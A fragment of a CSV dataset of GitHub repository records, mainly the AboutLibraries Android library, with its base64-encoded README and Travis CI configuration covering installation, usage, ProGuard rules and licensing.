IHNlcnZlciBvbiB0aGUgY29tcHV0ZXIgKGZvciBzaW1wbGlmaWVkIG5vIG9i
amVjdCBkZXRlY3Rpb24gdmVyc2lvbiwgcnVuIGByY19kcml2ZXJfbm5fb25s
eS5weWAgaW5zdGVhZCksIGFuZCB0aGVuIHJ1biBgc3RyZWFtX2NsaWVudC5w
eWAgYW5kIGB1bHRyYXNvbmljX2NsaWVudC5weWAgb24gcmFzcGJlcnJ5IHBp
LiAKClvkuK3mlofmlofmoaNdKGh0dHBzOi8vZ2l0aHViLmNvbS96aGFveWlu
ZzkxMDUvQXV0b1JDQ2FyKSAo5oSf6LCiW3poYW95aW5nOTEwNV0oaHR0cHM6
Ly9naXRodWIuY29tL3poYW95aW5nOTEwNSkpCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'AboutLibraries',19025014,b'AboutLibraries is a library to offer some information of libraries.',b'Kotlin',5,2377,,2377,False,b'https://api.github.com/repos/mikepenz/AboutLibraries/forks',"IyBBYm91dExpYnJhcmllcyBbIVtTdGF0dXNdKGh0dHBzOi8vdHJhdmlzLWNp
Lm9yZy9taWtlcGVuei9BYm91dExpYnJhcmllcy5zdmc/YnJhbmNoPW1hc3Rl
cildKGh0dHBzOi8vdHJhdmlzLWNpLm9yZy9taWtlcGVuei9BYm91dExpYnJh
cmllcykgWyFbTWF2ZW4gQ2VudHJhbF0oaHR0cHM6Ly9tYXZlbi1iYWRnZXMu
aGVyb2t1YXBwLmNvbS9tYXZlbi1jZW50cmFsL2NvbS5taWtlcGVuei9hYm91
dGxpYnJhcmllcy9iYWRnZS5zdmc/c3R5bGU9ZmxhdCldKGh0dHBzOi8vbWF2
ZW4tYmFkZ2VzLmhlcm9rdWFwcC5jb20vbWF2ZW4tY2VudHJhbC9jb20ubWlr
ZXBlbnovYWJvdXRsaWJyYXJpZXMpIFshW0FuZHJvaWQgQXJzZW5hbF0oaHR0
cDovL2ltZy5zaGllbGRzLmlvL2JhZGdlL0FuZHJvaWQlMjBBcnNlbmFsLUFi
b3V0TGlicmFyaWVzLWJyaWdodGdyZWVuLnN2Zz9zdHlsZT1mbGF0KV0oaHR0
cDovL2FuZHJvaWQtYXJzZW5hbC5jb20vZGV0YWlscy8xLzEwMikKClshW0pv
aW4gdGhlIGNoYXQgYXQgaHR0cHM6Ly9naXR0ZXIuaW0vbWlrZXBlbnovQWJv
dXRMaWJyYXJpZXNdKGh0dHBzOi8vYmFkZ2VzLmdpdHRlci5pbS9Kb2luJTIw
Q2hhdC5zdmcpXShodHRwczovL2dpdHRlci5pbS9taWtlcGVuei9BYm91dExp
YnJhcmllcz91dG1fc291cmNlPWJhZGdlJnV0bV9tZWRpdW09YmFkZ2UmdXRt
X2NhbXBhaWduPXByLWJhZGdlJnV0bV9jb250ZW50PWJhZGdlKQoKVGhlICoq
QWJvdXRMaWJyYXJpZXMqKiBsaWJyYXJ5IGFsbG93cyB5b3UgdG8gZWFzaWx5
IGNyZWF0ZSBhbiAqKnVzZWQgb3BlbiBzb3VyY2UgbGlicmFyaWVzKiogZnJh
Z21lbnQvYWN0aXZpdHkgd2l0aGluIHlvdXIgYXBwLiBBcyBhbiBleHRyYSBm
ZWF0dXJlIHlvdSBjYW4gYWxzbyBhZGQgYW4gKiphYm91dCB0aGlzIGFwcCoq
IHNlY3Rpb24uIAoKSGVyZSdzIGEgcXVpY2sgb3ZlcnZpZXcgb2YgZnVuY3Rp
b25zIGl0IGluY2x1ZGU6Ci0gKip1c2VkIG9wZW4gc291cmNlIGxpYnJhcmll
cyoqCgktIG5hbWUsIGRlc2NyaXB0aW9uLCBjcmVhdG9yLCBsaWNlbnNlLCB2
ZXJzaW9uLCAuLi4KLSAqKmFib3V0IHRoaXMgYXBwKiogc2VjdGlvbiAob3B0
aW9uYWwpCi0gYXV0b2RldGVjdCBsaWJyYXJpZXMKLSBtYW55IGluY2x1ZGVk
IGxpYnJhcnkgZGV0YWlscwotIGF1dG9tYXRpYyBjcmVhdGVkIGZyYWdtZW50
L2FjdGl2aXR5Ci0gZmVhdHVyZSByaWNoIGJ1aWxkZXIgdG8gc2ltcGx5IGNy
ZWF0ZSBhbmQgc3RhcnQgdGhlIGZyYWdtZW50IC8gYWN0aXZpdHkKLSBtdWNo
IG11Y2ggbW9yZS4uLiB0cnkgdGhlIHNhbXBsZSBmb3IgYSBxdWljayBvdmVy
dmlldy4KCiMgTW90aXZhdGlvbgoKTW9zdCBtb2Rlcm4gYXBwcyBmZWF0dXJl
IGEgIlVzZWQgTGlicmFyeSItc2VjdGlvbiwgd2hpY2ggcmVxdWlyZXMgaW5m
b3JtYXRpb24gYWJvdXQgdGhvc2UgcmVzcGVjdGl2ZSBsaWJzLiBBcyBpdCBn
ZXRzIGFubm95aW5nIHRvIGFsd2F5cyBjb3B5IHRob3NlIHN0cmluZ3MgdG8g
eW91ciBhcHAsIEkndmUgZGV2ZWxvcGVkIHRoaXMgc21hbGwgaGVscGVyIGxp
YnJhcnkgdG8gcHJvdmlkZSB0aGUgcmVxdWlyZWQgaW5mb3JtYXRpb24uCgoj
IE1pZ3JhdGlvbgotIFtNSUdSQVRJT04gR1VJREVdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9taWtlcGVuei9BYm91dExpYnJhcmllcy9ibG9iL2RldmVsb3AvTUlH
UkFUSU9OLm1kKQoKIyBHZXQgc3RhcnRlZAotIFtJbmNsdWRlIGluIHlvdXIg
cHJvamVjdF0oI2luY2x1ZGUtaW4teW91ci1wcm9qZWN0KQotIFtVc2FnZV0o
I3VzYWdlKQotIFtDb250cmlidXRlXSgjY29udHJpYnV0ZSkKCiMgTW9yZS4u
LgotIFtTYW1wbGUgKEdvb2dsZSBQbGF5IFN0b3JlKV0oaHR0cHM6Ly9wbGF5
Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWNvbS5taWtlcGVu
ei5hYm91dGxpYnJhcmllcy5zYW1wbGUpCi0gW0NyZWF0ZSBuZXcgZGVmaW5p
dGlvbiBmaWxlc10oaHR0cDovL2RlZi1idWlsZGVyLm1pa2VwZW56LmNvbS8p
Ci0gW0dldCBkZXRhaWxlZCBpbnN0cnVjdGlvbnMgaW4gdGhlIHdpa2ldKGh0
dHBzOi8vZ2l0aHViLmNvbS9taWtlcGVuei9BYm91dExpYnJhcmllcy93aWtp
KQotIFtDb21wYXRpYmxlL2luY2x1ZGVkIGxpYnNdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9taWtlcGVuei9BYm91dExpYnJhcmllcy93aWtpL0NvbXBhdGlibGUt
TGlicykKCgojIFNjcmVlbnNob3RzCiFbSW1hZ2VdKGh0dHBzOi8vcmF3Lmdp
dGh1YnVzZXJjb250ZW50LmNvbS9taWtlcGVuei9BYm91dExpYnJhcmllcy9t
YXN0ZXIvREVWL3NjcmVlbnNob3RzL3NjcmVlbnNob3QxX3NtYWxsLnBuZykK
IVtJbWFnZV0oaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21p
a2VwZW56L0Fib3V0TGlicmFyaWVzL21hc3Rlci9ERVYvc2NyZWVuc2hvdHMv
c2NyZWVuc2hvdDJfc21hbGwucG5nKQoKCiMgV2lraQpZb3UgY2FuIGZpbmQg
YW55dGhpbmcgeW91IHNlYXJjaCBmb3IgaW4gdGhlIHdpa2kuIChJZiBub3Qg
b3BlbiBhbiBpc3N1ZSkKCltCcmluZyBtZSB0byB0aGUgd2lraV0oaHR0cHM6
Ly9naXRodWIuY29tL21pa2VwZW56L0Fib3V0TGlicmFyaWVzL3dpa2kpCgoK
IyMgSW5jbHVkZSBpbiB5b3VyIHByb2plY3QKIyMjIFVzaW5nIE1hdmVuClRo
ZSBBYm91dExpYnJhcmllcyBMaWJyYXJ5IGlzIHB1c2hlZCB0byBbTWF2ZW4g
Q2VudHJhbF0oaHR0cDovL3NlYXJjaC5tYXZlbi5vcmcvI3NlYXJjaHxnYXwx
fGclM0ElMjJjb20ubWlrZXBlbnolMjIpLCBzbyB5b3UganVzdCBuZWVkIHRv
IGFkZCB0aGUgZm9sbG93aW5nIGRlcGVuZGVuY3kgdG8geW91ciBgYnVpbGQu
Z3JhZGxlYC4gSXQgc2VlbXMgaXQgaXMgYWxzbyByZXF1aXJlZCB0byBhZGQg
dGhlIHN1cHBvcnQgZGVwZW5kZW5jaWVzIHRvIHRoZSBhcHBsaWNhdGlvbi4g
SWYgaXQgd29ya3Mgd2l0aG91dCwgeW91IHNob3VsZCBiZSBmaW5lIHRvbyA6
KS4KCmBgYGphdmFzY3JpcHQKaW1wbGVtZW50YXRpb24gImNvbS5taWtlcGVu
ejphYm91dGxpYnJhcmllczo3LjAuNCIKCi8vcmVxdWlyZWQgc3VwcG9ydCBs
aWIgbW9kdWxlcwppbXBsZW1lbnRhdGlvbiAiYW5kcm9pZHguYXBwY29tcGF0
OmFwcGNvbXBhdDoke3ZlcnNpb25zLmFwcGNvbXBhdCB8IDEueC55fSIKaW1w
bGVtZW50YXRpb24gImFuZHJvaWR4LmNhcmR2aWV3OmNhcmR2aWV3OiR7dmVy
c2lvbnMuY2FyZHZpZXcgfCAxLngueX0iCmltcGxlbWVudGF0aW9uICJhbmRy
b2lkeC5yZWN5Y2xlcnZpZXc6cmVjeWNsZXJ2aWV3OiR7dmVyc2lvbnMucmVj
eWNsZXJ2aWV3IHwgMS54Lnl9IgppbXBsZW1lbnRhdGlvbiAiY29tLmdvb2ds
ZS5hbmRyb2lkLm1hdGVyaWFsOm1hdGVyaWFsOiR7dmVyc2lvbnMubWF0ZXJp
YWwgfCAxLngueX0iCmBgYAoKVG8gdXNlIGphdmEgdmVyc2lvbiBwbGVhc2Ug
dXNlIGEgdmVyc2lvbiBzbWFsbGVyIHRoYW4gNy4wLjAgKFNlZSB0aGUgcmVs
ZWFzZSBvbiBHaXRIdWIpClRvIHVzZSBhcHBjb21wYXQgcGxlYXNlIHVzZSBh
IHZlcnNpb24gc21hbGxlciB0aGFuIDYuMi4wLiAoU2VlIHRoZSByZWxlYXNl
cyBvbiBHaXRIdWIpCgpGdXJ0aGVyIGluZm9ybWF0aW9uIGFuZCBob3cgdG8g
dXNlIGl0IGlmIHlvdSBjYW4ndCB1cGRhdGUgdG8gdGhlIG5ld2VzdCBzdXBw
b3J0IGxpYnMgY2FuIGJlIGZvdW5kIGluIHRoZSBbd2lraV0oaHR0cHM6Ly9n
aXRodWIuY29tL21pa2VwZW56L0Fib3V0TGlicmFyaWVzL3dpa2kvSE9XVE86
LUluY2x1ZGUpCgojIyBVc2FnZQpZb3UgY2FuIHVzZSB0aGlzIGxpYnJhcnkg
aW4gYSBmZXcgZGlmZmVyZW50IHdheXMuIFlvdSBjYW4gY3JlYXRlIHlvdXIg
b3duIGFjdGl2aXR5LCBpbmNsdWRpbmcgYSBjdXN0b20gc3R5bGUgYW5kIGp1
c3QgdXNlIHRoZSBpbmZvcm1hdGlvbiwgb3IgeW91IGNhbiB1c2UgdGhlIGJ1
aWx0LWluIEFjdGl2aXR5IG9yIEZyYWdtZW50IGFuZCBqdXN0IHBhc3MgdGhl
IGxpYnMgeW91IHdvdWxkIGxvdmUgdG8gaW5jbHVkZS4KCiMjIyBVcGdyYWRl
IE5vdGVzCj4gSWYgeW91IHVwZ3JhZGUgZnJvbSA8IDUuOS41IGZvbGxvdyB0
aGUgW01JR1JBVElPTiBHVUlERV0oaHR0cHM6Ly9naXRodWIuY29tL21pa2Vw
ZW56L0Fib3V0TGlicmFyaWVzL2Jsb2IvZGV2ZWxvcC9NSUdSQVRJT04ubWQp
CgojIyMgQWN0aXZpdHkgLyBGcmFnbWVudAojIyMjIEZyYWdtZW50CmBgYGtv
dGxpbgp2YWwgZnJhZ21lbnQgPSBMaWJzQnVpbGRlcigpCiAgICAgICAgICAg
ICAgICAud2l0aExpYnJhcnlNb2RpZmljYXRpb24oImFib3V0bGlicmFyaWVz
IiwgTGlicy5MaWJyYXJ5RmllbGRzLkxJQlJBUllfTkFNRSwgIl9BYm91dExp
YnJhcmllcyIpCiAgICAgICAgICAgICAgICAuc3VwcG9ydEZyYWdtZW50KCkK
YGBgCiMjIyMgQWN0aXZpdHkKIyMjIyMgQ29kZToKYGBga290bGluCkxpYnNC
dWlsZGVyKCkKICAgICAgICAvL3Byb3ZpZGUgYSBzdHlsZSAob3B0aW9uYWwp
IChMSUdIVCwgREFSSywgTElHSFRfREFSS19UT09MQkFSKQogICAgICAgIC53
aXRoQWN0aXZpdHlTdHlsZShMaWJzLkFjdGl2aXR5U3R5bGUuTElHSFRfREFS
S19UT09MQkFSKQogICAgICAgIC8vc3RhcnQgdGhlIGFjdGl2aXR5CiAgICAu
c3RhcnQodGhpcykKYGBgCgojIyBTbWFsbCBleHRyYQpGb3IgdGhvc2Ugd2hv
IHJlYWQgdGhlIHdob2xlIFJFQURNRSBoZXJlJ3Mgb25lIG1vcmUgdGhpbmcu
CllvdSBjYW4gYWxzbyB1c2UgdGhlIEFib3V0TGlicmFyaWVzIGFjdGl2aXR5
IGFzIGFuICJhYm91dCB0aGlzIGFwcCIgc2NyZWVuLiBZb3UgYXNrIGhvdz8K
WWVhaCBwcmV0dHkgc2ltcGxlIGp1c3QgYWRkIHRoZSBmb2xsb3dpbmcgLnht
bCBmaWxlIChvciBqdXN0IHRoZSBzdHJpbmdzIC0gdGhlIGtleSBtdXN0IGJl
IHRoZSBzYW1lKSB0byB5b3VyIHByb2plY3QuCgpgYGB4bWwKPHJlc291cmNl
cz4KICAgIDxzdHJpbmcgbmFtZT0iYWJvdXRMaWJyYXJpZXNfZGVzY3JpcHRp
b25fc2hvd0ljb24iPnRydWU8L3N0cmluZz4KICAgIDxzdHJpbmcgbmFtZT0i
YWJvdXRMaWJyYXJpZXNfZGVzY3JpcHRpb25fc2hvd1ZlcnNpb24iPnRydWU8
L3N0cmluZz4KICAgIDxzdHJpbmcgbmFtZT0iYWJvdXRMaWJyYXJpZXNfZGVz
Y3JpcHRpb25fdGV4dCI+UGxhY2UgeW91ciBkZXNjcmlwdGlvbiBoZXJlIDpE
PC9zdHJpbmc+CjwvcmVzb3VyY2VzPgpgYGAKb3IgdXNlIHRoZSBidWlsZGVy
IGFuZCBhZGQgZm9sbG93aW5nOgpgYGBrb3RsaW4KCS53aXRoQWJvdXRJY29u
U2hvd24odHJ1ZSkKCS53aXRoQWJvdXRWZXJzaW9uU2hvd24odHJ1ZSkKCS53
aXRoQWJvdXREZXNjcmlwdGlvbigiVGhpcyBpcyBhIHNtYWxsIHNhbXBsZSB3
aGljaCBjYW4gYmUgc2V0IGluIHRoZSBhYm91dCBteSBhcHAgZGVzY3JpcHRp
b24gZmlsZS48YnIgLz48Yj5Zb3UgY2FuIHN0eWxlIHRoaXMgd2l0aCBodG1s
IG1hcmt1cCA6RDwvYj4iKQpgYGAKCiMjIFByb0d1YXJkCkV4Y2x1ZGUgYFJg
IGZyb20gUHJvR3VhcmQgdG8gZW5hYmxlIHRoZSAqKmxpYnJhcmllcyBhdXRv
IGRldGVjdGlvbioqCmBgYHByb2d1YXJkCi1rZWVwIGNsYXNzIC5SCi1rZWVw
IGNsYXNzICoqLlIkKiB7CiAgICA8ZmllbGRzPjsKfQpgYGAKCkluIGNhc2Ug
eW91IHdhbnQgdG8gbWluaW1pemUgeW91ciByZXNvdXJjZXMgYXMgbXVjaCBh
cyBwb3NzaWJsZSB1c2UgdGhlIGZvbGxvd2luZyBydWxlcyAoVGhhbmtzIHRv
IEBydWJlbmdlZXMgYW5kIEBBbGxhbldhbmcgYXMgZGlzY3Vzc2VkIGhlcmU6
IGh0dHBzOi8vZ2l0aHViLmNvbS9taWtlcGVuei9BYm91dExpYnJhcmllcy9p
c3N1ZXMvMzMxKQpgYGBwcm9ndWFyZAota2VlcGNsYXNzZXN3aXRobWVtYmVy
cyBjbGFzcyAqKi5SJCogewogICAgcHVibGljIHN0YXRpYyBmaW5hbCBpbnQg
ZGVmaW5lXyo7Cn0KYGBgClRoZXNlIHJ1bGVzICoqd2lsbCoqIHJlcXVpcmUg
eW91IHRvIGFkZCB0aGUgbGlicmFyaWVzIG1hbnVhbGx5LiAoc2VlIG1vcmUg
aW4gdGhlIGFib3ZlIGxpbmtlZCBpc3N1ZSkKCgojIyBDb250cmlidXRlCllv
dSBjYW4gY29udHJpYnV0ZSBieSBjcmVhdGluZyBhIGluZm9ybWF0aW9uIGZp
bGUgZm9yIGEgbmV3IGxpYnJhcnksIGFuZCBvcGVuIGEgcHVsbC1yZXF1ZXN0
IGF0IHRoZSBjcmVhdG9ycyBHaXQgcmVwb3NpdG9yeS4gSWYgaGUgZG9lc24n
dCBpbmNsdWRlIHRoZSBpbmZvcm1hdGlvbiBmaWxlIGluIGhpcyByZXBvLCBv
ciBpZiB0aGUgbGlicmFyeSBpc24ndCBtYWludGFpbmVkIGFueW1vcmUgeW91
IGNhbiBjcmVhdGUgYSBwdWxsLXJlcXVlc3QgaGVyZS4gRmluZCBtb3JlIGlu
Zm9ybWF0aW9uIGluIHRoZSB3aWtpIFtDcmVhdGUgYSBkZWZpbml0aW9uIGZp
bGVdKGh0dHBzOi8vZ2l0aHViLmNvbS9taWtlcGVuei9BYm91dExpYnJhcmll
cy93aWtpL0hPV1RPREVWOi1JbmNsdWRlLWludG8tQWJvdXRMaWJyYXJpZXMp
CgoKIyMgQWxyZWFkeSBpbiB1c2UgaW4gZm9sbG93aW5nIGFwcHMKKGZlZWwg
ZnJlZSB0byBzZW5kIG1lIG5ldyBwcm9qZWN0cykKCiogW3dhbGxzcGxhc2hd
KGh0dHBzOi8vcGxheS5nb29nbGUuY29tL3N0b3JlL2FwcHMvZGV0YWlscz9p
ZD1jb20ubWlrZXBlbnoudW5zcGxhc2gpCiogW051bWJlcnNdKGh0dHBzOi8v
cGxheS5nb29nbGUuY29tL3N0b3JlL2FwcHMvZGV0YWlscz9pZD1jb20udHVu
ZGVtLm51bWJlcnNyZWxvYWRlZC5mcmVlKQoqIFtNZWdhWWF0enldKGh0dHBz
Oi8vcGxheS5nb29nbGUuY29tL3N0b3JlL2FwcHMvZGV0YWlscz9pZD1jb20u
dHVuZGVtLnlhdHp5VEopCiogW1NpciBTcGVsbGFsb3RdKGh0dHBzOi8vcGxh
eS5nb29nbGUuY29tL3N0b3JlL2FwcHMvZGV0YWlscz9pZD1jb20uc2lyc3Bl
bGxhbG90LmFwcC5hbmRyb2lkKQoqIFtUViBUaW1lXShodHRwczovL3BsYXku
Z29vZ2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLnRvemVsYWJz
LnR2c2hvd3RpbWUpCiogW1N0cmVuZ3RoXShodHRwczovL3BsYXkuZ29vZ2xl
LmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLmUxM2VuZ2luZWVyaW5n
LnN0cmVuZ3RoKQoqIFtTcHJpdCBDbHViXShodHRwczovL3BsYXkuZ29vZ2xl
LmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9YXQuaWRldi5zcHJpdHByZWlz
ZSkKKiBbSG9sZCdFbSBQb2tlciBNYW5hZ2VyXShodHRwczovL3BsYXkuZ29v
Z2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9cHQubWFzc2VuYS5ob2xk
ZW10cmFja2VyLmZyZWUpCiogW1BpeENlbGw4XShodHRwczovL3BsYXkuZ29v
Z2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLnBpeGNlbGw4LnBy
b2QpCiogW01MIE1hbmFnZXJdKGh0dHBzOi8vcGxheS5nb29nbGUuY29tL3N0
b3JlL2FwcHMvZGV0YWlscz9pZD1jb20uamF2aWVyc2FudG9zLm1sbWFuYWdl
cikKKiBbVHVybk1lIFBhbm9yYW1hXShodHRwczovL3BsYXkuZ29vZ2xlLmNv
bS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLmJlemluZS5wYW5vc3BoZXJl
KQoqIFtOYXZpZydUb3Vyc10oaHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3Rv
cmUvYXBwcy9kZXRhaWxzP2lkPWNvbS5jb2RldHJvb3BlcnMudHJhbnNwb3J0
LnRvdXJzKQoqIFtBUyBTYWxlcyBNYW5hZ2VtZW50XShodHRwczovL3BsYXku
Z29vZ2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLmFybXNvZnQu
bXRyYWRlKQoqIFtOZXdzXShodHRwczovL3BsYXkuZ29vZ2xlLmNvbS9zdG9y
ZS9hcHBzL2RldGFpbHM/aWQ9Y29tLm1vYmxpbm8uY291bnRyeW5ld3MpCiog
W01ha290YSBNb25leSBNYW5hZ2VyXShodHRwczovL3BsYXkuZ29vZ2xlLmNv
bS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9YmUuamF0cmEubWFrb3RhKQoqIFtD
b21wYW5pb24gZm9yIEJhbmRdKGh0dHBzOi8vcGxheS5nb29nbGUuY29tL3N0
b3JlL2FwcHMvZGV0YWlscz9pZD1jb20ucGltcC5jb21wYW5pb25mb3JiYW5k
KQoqIFtBc2sgSmFuZWUgLSBBbnN3ZXIgUXVlc3Rpb25zXShodHRwczovL3Bs
YXkuZ29vZ2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLmFza2ph
bmVlLmFwcC5hbmRyb2lkKQoqIFtUZW1hZGFnYXJdKGh0dHBzOi8vcGxheS5n
b29nbGUuY29tL3N0b3JlL2FwcHMvZGV0YWlscz9pZD1jb20uYWx2YXJsYWdl
cmxvZi50ZW1hZGFnYXJhcHApCiogW0tQUyBDb25uZWN0XShodHRwczovL3Bs
YXkuZ29vZ2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9bWUubXNmamFy
dmlzLmtwc2Nvbm5lY3QpCiogW0J1ZGdldCBNYW5hZ2VyXShodHRwczovL3Bs
YXkuZ29vZ2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLmpha3Vi
bWF0ZXVzaWFrLmJ1ZGdldG1hbmFnZXIpCiogW0NhbGVuZHVsYV0oaHR0cHM6
Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWVzLnVz
Yy5jaXRpdXMuc2VydmFuZG8uY2FsZW5kdWxhKQoqIFtEcmlua2luZyBHYW1l
c10oaHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxz
P2lkPWNvbS5kcmlua2luZ2dhbWVzLmFuZHJvaWQpCiogW1JlY2lwZWRpYV0o
aHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lk
PWNvbS5tZC5yZWNpcGVkaWEpCiogW09yZGthbXAgRlJFRV0oaHR0cHM6Ly9w
bGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWNvbS5iZXRh
cGV0Lm1vYmlsZS5kay5mcmVlKQoqIFtPcmRrYW1wXShodHRwczovL3BsYXku
Z29vZ2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLmJldGFwZXQu
bW9iaWxlLmRrLmZ1bGwpCiogW09yZHNwaWxsIEdSQVRJU10oaHR0cHM6Ly9w
bGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWNvbS5hcC5v
cmRzcGlsbC5mcmVlKQoqIFtPcmRzcGlsbF0oaHR0cHM6Ly9wbGF5Lmdvb2ds
ZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWNvbS5hcC5vcmRzcGlsbC5m
dWxsKQoqIFtCZXRhcGV0IEZSRUVdKGh0dHBzOi8vcGxheS5nb29nbGUuY29t
L3N0b3JlL2FwcHMvZGV0YWlscz9pZD1jb20uYmV0YXBldC5tb2JpbGUuc2Uu
ZnJlZSkKKiBbQmV0YXBldF0oaHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3Rv
cmUvYXBwcy9kZXRhaWxzP2lkPWNvbS5iZXRhcGV0Lm1vYmlsZS5zZS5mdWxs
KQoqIFtDb250YWN0IExlbnNlcyBUaW1lXShodHRwczovL3BsYXkuZ29vZ2xl
LmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLmJyYW5kby5sZW50aSkK
KiBbSFRUUCBTaG9ydGN1dHNdKGh0dHBzOi8vZ2l0aHViLmNvbS9XYWJvb2Rv
by9IVFRQLVNob3J0Y3V0cykKKiBbS0FVIChsaWJyYXJ5KV0oaHR0cHM6Ly9h
bGxhbndhbmcuZ2l0aHViLmlvL0tBVS9hYm91dC8pCiogW0Zyb3N0IGZvciBG
YWNlYm9va10oaHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9k
ZXRhaWxzP2lkPWNvbS5waXRjaGVkYXBwcy5mcm9zdCkKKiBbT25lTWVtZTog
TWVtZSBNYWtlcl0oaHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBw
cy9kZXRhaWxzP2lkPWNvbS5tZW1lbWFrZXIuYW5kcm9pZCZobCkKKiBbYW5k
T1RQXShodHRwczovL3BsYXkuZ29vZ2xlLmNvbS9zdG9yZS9hcHBzL2RldGFp
bHM/aWQ9b3JnLnNoYWRvd2ljZS5mbG9ja2UuYW5kb3RwKQoKIyBEZXZlbG9w
ZWQgQnkKCiogTWlrZSBQZW56IAogKiBbbWlrZXBlbnouY29tXShodHRwOi8v
bWlrZXBlbnouY29tKSAtIDxtaWtlcGVuekBnbWFpbC5jb20+CiAqIFtwYXlw
YWwubWUvbWlrZXBlbnpdKGh0dHA6Ly9wYXlwYWwubWUvbWlrZXBlbnopCgoj
IExpY2Vuc2UKCiAgICBDb3B5cmlnaHQgMjAxOSBNaWtlIFBlbnoKCiAgICBM
aWNlbnNlZCB1bmRlciB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb24gMi4w
ICh0aGUgIkxpY2Vuc2UiKTsKICAgIHlvdSBtYXkgbm90IHVzZSB0aGlzIGZp
bGUgZXhjZXB0IGluIGNvbXBsaWFuY2Ugd2l0aCB0aGUgTGljZW5zZS4KICAg
IFlvdSBtYXkgb2J0YWluIGEgY29weSBvZiB0aGUgTGljZW5zZSBhdAoKICAg
ICAgIGh0dHA6Ly93d3cuYXBhY2hlLm9yZy9saWNlbnNlcy9MSUNFTlNFLTIu
MAoKICAgIFVubGVzcyByZXF1aXJlZCBieSBhcHBsaWNhYmxlIGxhdyBvciBh
Z3JlZWQgdG8gaW4gd3JpdGluZywgc29mdHdhcmUKICAgIGRpc3RyaWJ1dGVk
IHVuZGVyIHRoZSBMaWNlbnNlIGlzIGRpc3RyaWJ1dGVkIG9uIGFuICJBUyBJ
UyIgQkFTSVMsCiAgICBXSVRIT1VUIFdBUlJBTlRJRVMgT1IgQ09ORElUSU9O
UyBPRiBBTlkgS0lORCwgZWl0aGVyIGV4cHJlc3Mgb3IgaW1wbGllZC4KICAg
IFNlZSB0aGUgTGljZW5zZSBmb3IgdGhlIHNwZWNpZmljIGxhbmd1YWdlIGdv
dmVybmluZyBwZXJtaXNzaW9ucyBhbmQKICAgIGxpbWl0YXRpb25zIHVuZGVy
IHRoZSBMaWNlbnNlLgo=
",,"bGFuZ3VhZ2U6IGFuZHJvaWQKYW5kcm9pZDoKICBjb21wb25lbnRzOgogICAg
LSB0b29scwogICAgLSBidWlsZC10b29scy0yOS4wLjIKICAgIC0gYW5kcm9p
ZC0yOQpiZWZvcmVfaW5zdGFsbDoKICAgIC0geWVzIHwgc2RrbWFuYWdlciAi
cGxhdGZvcm1zO2FuZHJvaWQtMjkiCiAgICAtIHllcyB8IHNka21hbmFnZXIg
ImJ1aWxkLXRvb2xzOzI5LjAuMiIKamRrOgogICAgLSBvcmFjbGVqZGs4CnNj
cmlwdDoKICAgIC0gLi9ncmFkbGV3IGNsZWFuIGJ1aWxkCmJyYW5jaGVzOgog
IGV4Y2VwdDoKICAgIC0gZ2gtcGFnZXMKbm90aWZpY2F0aW9uczoKICBlbWFp
bDogZmFsc2UKYmVmb3JlX2NhY2hlOgogICAgLSBybSAtZiAkSE9NRS8uZ3Jh
ZGxlL2NhY2hlcy9tb2R1bGVzLTIvbW9kdWxlcy0yLmxvY2sKY2FjaGU6CiAg
ZGlyZWN0b3JpZXM6CiAgICAtICRIT01FLy5tMgogICAgLSAkSE9NRS8uZ3Jh
ZGxlL2NhY2hlcy8KICAgIC0gJEhPTUUvLmdyYWRsZS93cmFwcGVyLwo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
